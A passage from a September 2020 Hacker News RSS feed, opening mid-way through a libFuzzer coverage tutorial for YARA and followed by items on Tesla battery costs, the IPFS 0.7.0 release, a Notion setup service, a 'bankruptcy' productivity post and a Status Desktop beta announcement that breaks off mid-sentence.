  tests/oss-fuzz/rules_fuzzer.cc

libtool --mode=link --tag=CXX clang++ \
  -fsanitize=address,fuzzer -fprofile-instr-generate \
  -fcoverage-mapping \
  -lcrypto -lssl -pthread \
  yara_rules_lfuzzer_cov.o libyara/libyara.la \
  -o yara_rules_lfuzzer_cov
</code></pre>

<p>We have to run the fuzzer together with additional switches and variables:</p>

<pre><code>LLVM_PROFILE_FILE="yara.profraw" \
  libtool --mode=execute \
  ./yara_rules_lfuzzer_cov -runs=1 ../yara-fuzzing-corpus
INFO: Seed: 3494707497
INFO: Loaded 2 modules   (10070 inline 8-bit counters): 10063 [0x7f3b18be361f, 0x7f3b18be5d6e), 7 [0x5ad045, 0x5ad04c),
INFO: Loaded 2 PC tables (10070 PCs): 10063 [0x7f3b18be5d70,0x7f3b18c0d260), 7 [0x56f4b0,0x56f520),
INFO:     1115 files found in ../yara-fuzzing-corpus/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 19232 bytes
INFO: seed corpus: files: 1115 min: 4b max: 19232b total: 1797733b rss: 36Mb
#1024   pulse  cov: 2719 ft: 10489 corp: 735/695Kb exec/s: 341 rss: 264Mb
#1117   INITED cov: 2738 ft: 10987 corp: 781/1017Kb exec/s: 372 rss: 264Mb
#1117   DONE   cov: 2738 ft: 10987 corp: 781/1017Kb lim: 19232 exec/s: 372 rss: 264Mb
Done 1117 runs in 3 second(s)
</code></pre>

<p>The result is a file with the .profraw extension, which must be indexed before
generating coverage report with the command:</p>

<pre><code>llvm-profdata merge -sparse yara.profraw -o yara.profdata
</code></pre>

<p>The result of the last operation is a file that can be passed to the
SanitizerCoverage report generator (of course you can debug your
harness with coverage!):</p>

<pre><code>llvm-cov show ./yara_rules_lfuzzer_cov.o -instr-profile=yara.profdata
&lt;snipped&gt;                                                  
   30|       |#include &lt;stdint.h&gt;
   31|       |#include &lt;stddef.h&gt;
   32|       |#include &lt;string.h&gt;
   33|       |
   34|       |#include &lt;yara.h&gt;
   35|       |
   36|       |
   37|       |extern "C" int LLVMFuzzerInitialize(int* argc, char*** argv)
   38|      1|{
   39|      1|   yr_initialize();
   40|      1|  return 0;
   41|      1|}
   42|       |
   43|       |
   44|       |extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
   45|  1.11k|{
   46|  1.11k|  YR_RULES* rules;
   47|  1.11k|  YR_COMPILER* compiler;
   48|  1.11k|
   49|  1.11k|  char* buffer = (char*) malloc(size + 1);
   50|  1.11k|
   51|  1.11k|  if (!buffer)
   52|      0|    return 0;
   53|  1.11k|
   54|  1.11k|  strncpy(buffer, (const char *) data, size);
   55|  1.11k|  buffer[size] = 0;
   56|  1.11k|
   57|  1.11k|  if (yr_compiler_create(&amp;compiler) != ERROR_SUCCESS)
   58|  1.11k|  {
   59|      0|    free(buffer);
   60|      0|    return 0;
   61|      0|  }
   62|  1.11k|
   63|  1.11k|  if (yr_compiler_add_string(compiler, (const char*) buffer, NULL) == 0)
   64|    119|  {
   65|    119|    if (yr_compiler_get_rules(compiler, &amp;rules) == ERROR_SUCCESS)
   66|    119|      yr_rules_destroy(rules);
   67|    119|  }
   68|  1.11k|
   69|  1.11k|  yr_compiler_destroy(compiler);
   70|  1.11k|  free(buffer);
   71|  1.11k|
   72|  1.11k|  return 0;
   73|  1.11k|}
</code></pre>

<p>The amount of executions of the specified functions in our harness for the prepared corpora.</p>

<p>Additionally, you can print a summary of coverage data for modules or for individual files:</p>

<pre><code>llvm-cov report ./libyara/hex_grammar.o -instr-profile=foo.profdata
Filename                      Regions    Missed Regions     Cover   Functions  Missed Functions  Executed       Lines      Missed Lines     Cover
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
hex_grammar.c                     489               120    75.46%           4                 0   100.00%         961               165    82.83%
 
Files which contain no functions:
include/yara/hex_lexer.h            0                 0         -           0                 0         -           0                 0         -
include/yara/limits.h               0                 0         -           0                 0         -           0                 0         -
include/yara/re.h                   0                 0         -           0                 0         -           0                 0         -
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
TOTAL                             489               120    75.46%           4                 0   100.00%         961               165    82.83%
</code></pre>



<p>It is worth mentioning that many open-source projects have a variety of test
corpora, sometimes even including file formats no longer in broad use.
Additionally, unit tests provide a very good source of test cases. After
writing a proper parser, they can significantly improve code coverage.
Searching for the file extension with Google also brings very good results.</p>

<p>If the project does not provide tests or corpora, the only remaining option is
to generate a useful set of files manually: in the case of text formats, it is
easy to find relevant information in the code and use it in your files.
Binary files can often be obtained using conversion tools included in the project.
All you need to do is to find a file in a format supported by
the converter and script it to generate the output. Finally, I would like to remind you
once again to minimize the file sizes.</p>

<p>One of the key elements causing increased code coverage are
dictionaries - text files containing constants for a given file format. This
saves the CPU time that would otherwise be needed to perform the initial
validation of key elements of the tested format. Dictionaries from AFL
and libFuzzer are compatible with each other - the initial ‚Äúcorpora‚Äù of the
dictionaries can be found in
<a href="https://github.com/google/fuzzing/tree/master/dictionaries">https://github.com/google/fuzzing/tree/master/dictionaries</a>.</p>



<p>libFuzzer‚Äôs originator and Google employee, Kostya Serebryany, proposed to
extend the classic continuous integration approach to fuzzing. Due to the fact
that libFuzzer fuzzers are very similar to unit tests, and unit tests alone
are not able to saturate the security tests, this approach is worth considering
in the project testing cycle.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/testing_developing_fuzzing.svg" alt="Testing, Developing, Fuzzing"></p>

<p>Based on libFuzzer, Google launched in December 2016 an open-source project
fuzzing service called OSS-Fuzz. Each open-source project developer can apply
for testing their own application. The only requirement is to write your own
fuzzer and create a pull-request to the Google repository.</p>

<p>At the time of writing the article there were 25,000 VMs available for OSS-Fuzz.
From its start, the project helped to find more than 11,000 different problems in the
following projects: OpenSSL, ffmpeg, LibreOffice, sqlite3 and freetype2.</p>

<p>Integrating an efficient fuzzer into your project has never been so easy and
cheap. In the era of (almost) cost-free computing power and easy access to cloud
servers, it is worthwhile to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/">https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-to-integrate-a-fuzzer-with-your-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579207</guid>
            <pubDate>Thu, 24 Sep 2020 14:56:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Do Musical Scales Have Certain Numbers of Notes?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579111">thread link</a>) | @lucaspauker
<br/>
September 24, 2020 | https://www.lucaspauker.ml/articles/16 | <a href="https://web.archive.org/web/*/https://www.lucaspauker.ml/articles/16">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lucaspauker.ml/articles/16</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579111</guid>
            <pubDate>Thu, 24 Sep 2020 14:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elon Musk Promises a Next-Gen Battery Equipped $25,000 Electric Car]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579050">thread link</a>) | @elorant
<br/>
September 24, 2020 | https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/ | <a href="https://web.archive.org/web/*/https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span>Tesla announced that it will considerably reduce the asking prices of its battery cells and packs, meaning, the company‚Äôs next goal is a $25,000 electric car.</span></p>
<p><span>It looks like Tesla will soon be coming with a new electric car carrying a $25,000 price tag. The company‚Äôs chief executive Elon Musk said its new ‚Äútabless‚Äù battery cells, and changing the materials used inside the cell, will enable the company to have the price per kilowatt-hour, which will enable them to make electric cars about the same price as combustion engine cars.</span></p>
<p><span>The kWh price per (kilowatt-hour) is the unit of energy, ideally used to measure the capacity packed by the battery inside modern electric vehicles. Those prices have been significantly declining over the last decade, from $1,100/kWh in 2010 to $156/kWh in 2019, a drop of 87 percent.</span></p>
<p><span>Experts suggest that the price is likely to hit $100/kWh by 2023, but Musk said Tesla will initiate a three-year process to bring the price below that, but did not reveal the exact price target. There is more to a battery than just its cell.</span></p>
<p><span>A lithium-ion battery cell that would normally cost you $100/kWh to produce mean a battery pack, with its additional components including cooling systems and battery management, could set you back $125‚Äì$130/kWh or more.</span></p>
<p><span>Today‚Äôs battery packs cost about $10,000‚Äì$12,000, based on their capacity. Reduced battery prices could pave the way for more affordable, higher volume electric cars. Tesla is bent on bringing the cost of future packs down to $6,000 or less, putting the cell cost under $100/kWh.</span></p>
<p><span>The average price of electric cars in the United States continues to drop ‚Äì from $64,300 in 2018 to $55,600 last year, a 13.4 percent decline. That‚Äôs primarily because of Tesla‚Äôs Model 3.</span></p>
<p><span>This is still high as compared to the average price of a gas-burning vehicle at $36,600. It is worth mentioning here that the price has been ticking upward recently.</span></p>
<p><span>The Model 3 was originally slated to be Tesla‚Äôs first car for the broader market. Tesla‚Äôs master plan from early on, as outlined by Musk in a <a href="https://www.tesla.com/blog/secret-tesla-motors-master-plan-just-between-you-and-me?redirect=no" target="_blank" rel="noopener noreferrer">blog post</a> in 2006, revolves around how it would build a highly appealing electric sports car in a bid to convince buyers that EVs can be cool too, use the revenue from there to bankroll a more affordable luxury sedan, and use the funds from the effort into building a car that people could buy without burning a hole in their pockets.</span></p>
<p><span>Due to Tesla‚Äôs well documented ‚Äúproduction hell,‚Äù Musk‚Äôs plan to build a $35,000 Model 3 did not come to fruition. The Model 3 Standard Range Plus starts at $37,990, the Performance starts at $54,990, and the Long Range starts at $46,990.</span></p>
<p><span>Musk first promised a $25,000 EV two years ago, which he said was possible within three years. ‚ÄúI think in order for us to get up to‚Ä¶a 25,000 car, that‚Äôs something we can do,‚Äù Musk said in an interview with YouTuber Marques Brownlee.</span></p>
<blockquote>
<p dir="ltr" lang="en">Musk: ‚ÄúLong-term we want to make about 20 million vehicles per year‚Äù</p>
<p>That‚Äôs roughly twice the production volume of Toyota, GM, or Volkswagen.</p>
<p>‚Äî E.W. Niedermeyer (@Tweetermeyer) <a href="https://twitter.com/Tweetermeyer/status/1308536403018440704?ref_src=twsrc%5Etfw">September 22, 2020</a></p></blockquote>

<p><span>‚ÄúBut if we work really hard I think maybe we can do that in about three years,‚Äù he explained. At <a href="https://plus.auczar.com/live-how-to-watch-tesla-battery-day-reveal-expect-big-surprises/" target="_blank" rel="noopener noreferrer">Battery Day</a> Musk made a new prediction hinting at 20 million cars a year, which roughly is twice the current production of Volkswagen, GM, or Toyota, author of Ludicrous: the Unvarnished Story of Tesla Motors Ed Niedermeyer tweeted.</span></p>
<p><iframe src="https://www.youtube.com/embed/MevKTPN4ozw" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<!-- AI CONTENT END 1 -->
</div></div>]]>
            </description>
            <link>https://plus.auczar.com/elon-musk-promises-a-next-gen-battery-equipped-25000-electric-car/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579050</guid>
            <pubDate>Thu, 24 Sep 2020 14:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IPFS 0.7.0, the SECIO retirement edition]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 44 (<a href="https://news.ycombinator.com/item?id=24578953">thread link</a>) | @georgyo
<br/>
September 24, 2020 | https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/ | <a href="https://web.archive.org/web/*/https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    


    <div>
      
      <p>by Jacob Heun &amp; Adin Schmahmann on 2020-09-24</p>

      

      

<p>In August we announced the <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">deprecation of the SECIO security transport</a>. In this release we have disabled SECIO by default, which will have an impact on older nodes on the network. The best way to mitigate the impact of this change is to <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrade your IPFS nodes</a> as soon as possible! Not only will upgrading ensure you‚Äôre using the latest security transports, you‚Äôll get access to all of the <a href="https://blog.ipfs.io/2020-07-20-dht-deep-dive/">performance improvements</a> we‚Äôve made this year to content routing.</p>

<p>With this release you will also start seeing more Peer IDs and IPNS Keys on the network that start with <code>1</code> instead of the typical <code>Qm</code>. This is due to a switch to ed25519 keys being used by default over RSA keys, which you can read more about in the highlights below.</p>

<p>üö® For those of you using plugins with IPFS there is a breaking change detailed below to the build process.</p>



<h2 id="secio-is-now-disabled-by-default">üîí SECIO is now disabled by default</h2>

<p>As part of deprecating and removing support for the SECIO security transport, we have disabled it by default. TLS1.3 will remain the default security transport with fallback to Noise. You can read more about the deprecation in the blog post, <a href="https://blog.ipfs.io/2020-08-07-deprecating-secio/">https://blog.ipfs.io/2020-08-07-deprecating-secio/</a>. If you‚Äôre running Go IPFS older than 0.5 or JS IPFS older than 0.47, this may start to impact your performance on the public network, so we strongly encourage you to upgrade today!</p>

<h2 id="ed25519-keys-are-now-used-by-default">üóùÔ∏è Ed25519 keys are now used by default</h2>

<p>Previously go-ipfs generated 2048 bit RSA keys for new nodes, but it will now use ed25519 keys by default. This will not affect any existing keys, but newly created keys will be ed25519 by default. The main benefit of using ed25519 keys over RSA is that ed25519 keys have an inline public key. This means that someone only needs your PeerId to verify things you‚Äôve signed, such as your Peer Records or in the future Signed Provider Records, which means we don‚Äôt have to worry about storing bulky RSA public keys.</p>

<h3 id="rotating-keys">Rotating keys</h3>

<p>Along with switching the default key type, we‚Äôve added support for rotating Identity keys. If you would like to change the key type of your IPFS node, you can now do so with the rotate command. <strong>NOTE: This will affect your Peer Id, so be sure you want to do this!</strong> Your existing identity key will be backed up in the Keystore so that it can still be referenced for things like IPNS records.</p>

<pre><code>$ ipfs key rotate -o my-old-key -t ed25519
</code></pre>

<h2 id="key-export-import">üì¶ Key export/import</h2>

<p>Speaking of backing up keys, we‚Äôve added commands to allow you to export and import keys from the IPFS Keystore to a local .key file. This does not currently apply to the IPFS identity key, <code>self</code>, which is housed in the configuration file.</p>

<pre><code>$ ipfs key gen mykey
$ ipfs key export -o mykey.key mykey # ./&lt;name&gt;.key is the default path
$ ipfs key import mykey mykey.key # on another node
</code></pre>

<h2 id="ipns-paths-now-encode-the-key-name-as-a-base36-cidv1-by-default">#Ô∏è‚É£ IPNS paths now encode the key name as a base36 CIDv1 by default</h2>

<p>Previously go-ipfs encoded the key names for IPNS paths as base58btc multihashes (e.g. <code>Qmabc...</code>). We now encode them as base36 encoded CIDv1s as defined in the <a href="https://github.com/libp2p/specs/blob/master/peer-ids/peer-ids.md#string-representation">peerID spec</a> (e.g. <code>k51xyz...</code>) which also deals with the encoding of public keys. This is nice because it means that IPNS keys will by default be case-insensitive and that they will fit into DNS labels (e.g. <code>k51xyz...ipns.localhost</code>) and therefore that subdomain gateway redirections (e.g. from <code>localhost:8080/ipns/{key}</code> to <code>{key}.ipns.localhost</code>) will look better to users in the default case.</p>

<p>Many commands will accept a <code>--ipns-base</code> option that allows changing command outputs to use a particular encoding (i.e.  base58btc multihash, or CIDv1 encoded in any supported base):</p>

<pre><code>$ ipfs key list -l --ipns-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK self
$ ipfs key list -l --ipns-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2 self
</code></pre>

<h2 id="multiaddresses-now-accept-peerids-encoded-as-cidv1">üìÆ Multiaddresses now accept PeerIDs encoded as CIDv1</h2>

<p>In preparation for eventually changing the default PeerID representation multiaddresses can now contain strings like <code>/p2p/k51xyz...</code> in addition to the default <code>/p2p/Qmabc...</code>. There is a corresponding <code>--peerid-base</code> option to many functions that output peerIDs:</p>

<pre><code>$ ipfs id --format "&lt;id&gt;" --peerid-base b58mh
12D3KooWCjhz69LskTZEC5vFWs8eDpHo7kYbGzrC5EjU75BHSmVK
$ ipfs id --format "&lt;id&gt;" --peerid-base base36
k51qzi5uqu5dh9ihj4p2v5sl3hxvv27ryx2w0xrsv6jmmqi91t9xp8p9kaipc2
</code></pre>

<h2 id="dag-stat-command">üßÆ <code>dag stat</code> command</h2>

<p>Initial support has been added for the <code>ipfs dag stat</code> command. Running this command will traverse the DAG for the given root CID and report statistics. By default, progress will be shown as the DAG is traversed. Supported statistics currently include DAG size and number of blocks.</p>

<pre><code>$ ipfs dag stat bafybeihpetclqvwb4qnmumvcn7nh4pxrtugrlpw4jgjpqicdxsv7opdm6e # the IPFS webui
Size: 30362191, NumBlocks: 346
</code></pre>

<h2 id="plugin-build-changes">üö® Plugin build changes üö®</h2>

<p>We have changed the build flags used by the official binary distributions on <a href="https://dist.ipfs.io/">dist.ipfs.io</a> (or <code>/ipns/dist.ipfs.io</code>) to use the simpler and more reliable <code>-trimpath</code> flag instead of the more complicated and brittle <code>-asmflags=all=-trimpath="$(GOPATH)" -gcflags=all=-trimpath="$(GOPATH)"</code> flags, however the build flags used by default in go-ipfs remain the same.</p>

<p>The scripts in <a href="https://github.com/ipfs/go-ipfs-example-plugin">go-ipfs-example-plugin</a> have been updated to reflect this change. This is a <strong>breaking change</strong> to how people have been building plugins against the dist.ipfs.io binary of go-ipfs and plugins should update their build processes accordingly. See <a href="https://github.com/ipfs/go-ipfs-example-plugin/pull/9">go-ipfs-example-plugin/pull/9</a> for details.</p>

<h2 id="the-changelog">The Changelog</h2>

<p>For a full list of updates included in this release you can review the Changelog at <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22">https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#v070-2020-09-22</a>.</p>

<h2 id="thank-you-contributors">Thank you contributors!</h2>

<p>A huge thank you to <a href="https://github.com/ipfs/go-ipfs/blob/v0.7.0/CHANGELOG.md#contributors">everyone who contributed</a> patches and improvements in this release, all <strong>53</strong> of you! We couldn‚Äôt have made this happen without your help and feedback. ‚ù§</p>

<h2 id="install-upgrade-and-join-us">Install, upgrade, and join us!</h2>

<p>You can get started by <a href="https://dist.ipfs.io/#go-ipfs">installing go-ipfs</a> or <a href="https://docs.ipfs.io/recent-releases/go-ipfs-0-7/update-procedure">upgrading to go-ipfs 0.7</a>.</p>

<p>There are many ways to get involved with IPFS based on your skill set, interest, and availability.  Please check out <a href="https://github.com/ipfs/community/blob/master/CONTRIBUTING.md">our contribution page</a> on GitHub for guidance and next steps.</p>

<p>This is an exciting time for IPFS and the web in general. Join us!</p>


      
          
          
          
      
    </div>
  </div></div>]]>
            </description>
            <link>https://blog.ipfs.io/2020-09-24-go-ipfs-0-7-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578953</guid>
            <pubDate>Thu, 24 Sep 2020 14:33:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Ready-Made CRM, Project and Content Management on Notion]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24578943">thread link</a>) | @saviorand
<br/>
September 24, 2020 | https://optemization.com/preconceived | <a href="https://web.archive.org/web/*/https://optemization.com/preconceived">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="/preconceived"><div id="/df2631fcf3ab4d74bfb32255cee6151d"><div id="/f3a8a7556e534222be5e49e6fb2c9ef6"><blockquote id="/7100cd2e553b454ab5102d49c9c9c48f"><span><span>Functional Notion workspaces take hours to create. To setup yourself and your team, you'd have to learn, ideate, build, iterate, and train. Let Optemization take care of this.

</span><span><strong>In two weeks flat.</strong></span></span></blockquote></div></div><h3><span id="/8dc73654f3b645b18006ee25d1bb0cfc"></span><span><span>üì¶ Components</span></span></h3><div id="/74c3d09ab64f4127abaeac25d78eed42"><div id="/a9f4c8f2706a40b19028c89ec97026e8"><p><span><span><strong>Foundational Databases</strong></span></span></p><p><span><span>‚Üí Eleven databases with properties and templates pre-built</span></span></p><ul><li id="/b56f8c313d22445ba331a9c56073cbed"><span><span>Project management suite with for task, calendar, project databases</span></span></li><li id="/7a82c37bf18a42cab68dadea85212342"><span><span>CRM suite with company, people, industry, geography databases</span></span></li><li id="/fd5f5c66de8f4986a9a784efdd6e8e39"><span><span>Resources suite with for content, topic databases</span></span></li><li id="/8ea94eb3df3c4ffa99ca78e24503cdfe"><span><span>Workspace hierarchy with three top-level pages</span></span></li><li id="/d44e005dffc84274af7dcf2f68ec130f"><span><span>Eleven database templates</span></span></li><li id="/e819d910acab47168608f868293a6a83"><span><span>$1000 credit</span></span></li><li id="/8cfdf53823ed4f6199f85397682457af"><span><span>1 hour onboarding meeting</span></span></li></ul></div></div><div id="/ce69d2f7689448ce8af6af68c6950bb9"><div id="/9987596c4d4e4e7099539209c83d70a7"><p><span><span><strong>Personalized Dashboards</strong></span></span></p><p><span><span>‚Üí Three customizable dashboards</span></span></p><ul><li id="/1bcf8781b59b47dbb85e426df06d2455"><span><span>Personal dashboard</span></span></li><li id="/b567781f9eb94096a4981739aa8bf700"><span><span>Vertical project dashboard</span></span></li><li id="/ea8517dbc1f34b49acc9333437539481"><span><span>Horizontal project dashboard</span></span></li><li id="/ecd1c7606e4c4229909eb2a4e5d786f5"><span><span>Dashboard component library</span></span></li><li id="/fe950994c03143f9b89b0f2adc7b44d0"><span><span>1 hour personalization meeting</span></span></li></ul></div></div><div id="/c43afe7bd97e4eb69e857db6c0b2abde"><div id="/d6f53f22277e4f6a9728ae71f6f03d77"><p><span><span><strong>Bonus Support</strong></span></span></p><ul><li id="/504337f059c94e02b38782626b35c482"><span><span>Shared Slack Connect channel</span><span><span>*</span></span></span></li><li id="/4b53e407064046d1b105399317f9e88c"><span><span>Curated Notion updates and content</span></span></li><li id="/fed65626c7414f0da78c7eeec6e5d222"><span><span>Discounts on future services and tools </span></span></li></ul><p><span><span>*Requires Standard Plan</span></span></p></div></div><h3><span id="/0b78decb95c24aa8b8771b3041080f4d"></span><span><span>üñ•Ô∏è Demo</span></span></h3><h3><span id="/56d6370823f34ff6bf3d2f2ddbfea3d5"></span><span><span>üìÜ Timeline</span></span></h3><p><span><span><strong>Six steps including two meetings (example dates).</strong></span></span></p><div id="/0de5b0f2af9944039b1a02342f8d0cd8"><div id="/5ea01ed9dfb244ae829b371d5c8a7ef9"><p><span><span><strong>üóøStart Installation</strong></span></span></p><p><span><span>üí¨</span><span><strong>Onboarding Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Databases</strong></span></span></p><p><span><span>üí¨</span><span><strong>Customization Meeting</strong></span></span></p><p><span><span>üì¶</span><span><strong>Ship Dashboards</strong></span></span></p><p><span><span><strong>üóøCompletion Installation</strong></span></span></p></div><div id="/20f078e837764769ac3290a5f4ba6221"><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 5, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 12, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span>Oct 19, 2020</span></span></p><p><span><span><strong>14 days</strong></span></span></p></div></div><h3><span id="/fdd2e4c53e3848a7ade37b394d8b9430"></span><span><span>üí≥ Pricing</span></span></h3><p><span><span><strong>$3,000. Split up as follows</strong></span></span></p><div id="/24038df326844c6693e5f7ecf3dcc093"><div id="/9ed4fc58aaec46cb9f76ca91e51408b5"><p><span><span>üßæ</span><span><strong>Deposit Payment</strong></span></span></p><p><span><span><strong>üì¶Add Credit</strong></span></span></p><p><span><span>üßæ</span><span><strong>Final Payment</strong></span></span></p></div></div><h3><span id="/6d214b8077b04c56a2b46d400dc03207"></span><span><span>üîí Checkout</span></span></h3><p><span><span><strong>You will not be charged immediately.</strong></span></span></p></article></div></div>]]>
            </description>
            <link>https://optemization.com/preconceived</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578943</guid>
            <pubDate>Thu, 24 Sep 2020 14:32:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Declare bankruptcy and don‚Äôt be ashamed of it]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24578858">thread link</a>) | @mcrittenden
<br/>
September 24, 2020 | https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1461">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>I‚Äôm not talking about financial bankruptcy. I‚Äôm talking about all the other kinds of bankruptcy:</p>



<ul><li>Email bankruptcy (anything important will come back up)</li><li>Backlog bankruptcy (because <a href="https://critter.blog/2020/09/03/backlogs-are-not-idea-buckets/">Backlogs are not idea&nbsp;buckets</a>)</li><li>Books-to-read list bankruptcy (if your TBR list is 100+ books long, it‚Äôs not doing you any good)</li><li>Slack inbox bankruptcy (i.e., the first-day-back-from-vacation feeling)</li><li>Wiki bankruptcy (<a href="https://critter.blog/2020/08/10/wiki-bankruptcy/">I wrote about this one before</a>)</li><li>Social networking notification bankruptcy (this shouldn‚Äôt even be a question)</li><li>Browser tab bankruptcy (you can find stuff again when you to, but you won‚Äôt)</li><li>Garage/attic bankruptcy (don‚Äôt try to go through it, pay someone to haul it all away)</li></ul>



<p>If you feel like declaring bankruptcy is a failure, stop that. It‚Äôs not a failure. It‚Äôs a fresh start. It‚Äôs a powerful tool and we should take advantage of it. It‚Äôs a weight lifted. </p>



<p>If your washing machine breaks, you can spend hours and hours learning how to fix the stupid thing, or you can toss it and buy a new one. Buying a new one is nothing to be ashamed of. It‚Äôs practical. You‚Äôre declaring dryer bankruptcy (I know the metaphor is a stretch, shut up).</p>



<p>Sure, if you declare bankruptcy on the same thing over and over, then you should examine your patterns about that thing. Bankruptcy is a voice that says ‚Äúwhat can you do to make it unnecessary to do this again?‚Äù </p>



<p>Try it. Declare bankruptcy and <a href="https://twitter.com/mcrittenden">come tell me</a> if you don‚Äôt feel ten times better afterwards.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578858</guid>
            <pubDate>Thu, 24 Sep 2020 14:22:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Re-Introducing Status Desktop ‚Äì Beta v0.1.0. Available on Windows, Mac, Linux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578847">thread link</a>) | @jonnyz
<br/>
September 24, 2020 | https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/ | <a href="https://web.archive.org/web/*/https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                    <div>
                        <div>
                            <p><em>Status Desktop returns as beta v0.1.0 to provide private, secure communication on Mac, Windows, and Linux.</em></p><p>Some may have remembered the moment in <a href="https://twitter.com/ethstatus/status/1058303254600261635">November 2018 at DevconIV</a>, when Status officially pulled the plug on the core contributor Slack and migrated entirely over to Status Desktop alpha. It was a massive moment for Status and the mission to provide private, secure communication no matter where you are ‚Äì on the go with your smartphone or while at work at your desk.</p><p>The conversation in Status Desktop was flowing and the product was improving each day - dogfooding at its finest. However, as many know, building infrastructure and privacy preserving tools from the ground up that adhere to the strict values and principles of the Status community, is challenging to say the least. With that, the team decided to prioritize the Status mobile app and put development of the desktop client on pause. </p><p>Fast forward roughly one year, v1 of the Status mobile app is live in the <a href="https://status.im/get/">App and Playstore</a>, and development of desktop is back underway driven by a dedicated team. </p><p>Today, Status officially re-introduces the Desktop client as beta v0.1.0 ‚Äì marking a huge milestone in bringing decentralized messaging no matter where you are. The team, along with community contributors, have been steadily working on the client for the past few months. Developer builds have only been available via the Github repository for the team along with those willing to try out experimental software. With key features implemented and bringing the desktop messenger close to feature parity with the mobile app, it is officially ready for wider testing and can be downloaded for Mac, Windows, and Linux <a href="https://status.im/get/">here</a></p><h3 id="a-focus-on-messaging">A Focus on Messaging</h3><p>While the Status Mobile App provides a holistic experience for communication and access to Ethereum with an integrated private messenger, Ethereum wallet, and Web3 DApp browser, the desktop app focuses initially on the messenger. It includes all the key features of the mobile application including private 1:1 chats, private group chats, community public channels, images in 1:1 and group chats, emoji reactions and more. </p><p>Status Desktop is truly the first desktop messenger built in line with Status Principles. It leverages <a href="https://our.status.im/peer-to-peer-messaging-where-whisper-falls-short-and-waku-picks-up/">Waku</a> for peer-to-peer messaging just like the mobile app. Waku, the fork of the Whisper protocol, aims to deliver the removal of centralized rent seeking intermediaries, decentralization of the network and removal of single points of failure, and censorship resistance.</p><h3 id="limited-wallet-availability">Limited Wallet Availability</h3><p>Desktop includes access to the Status Sticker Market as well as the ability to register and display stateofus.eth ENS usernames which both require SNT. For this reason, the wallet is available but is hidden from the UI unless toggled on under advanced settings (Profile &gt;&gt; Advanced &gt;&gt; Wallet Tab). Status Desktop has not undergone a formal security audit so wallet features are available at the risk of the user. </p><h3 id="web3-dapp-browser-coming-soon">Web3 DApp Browser Coming Soon</h3><p>The Web3 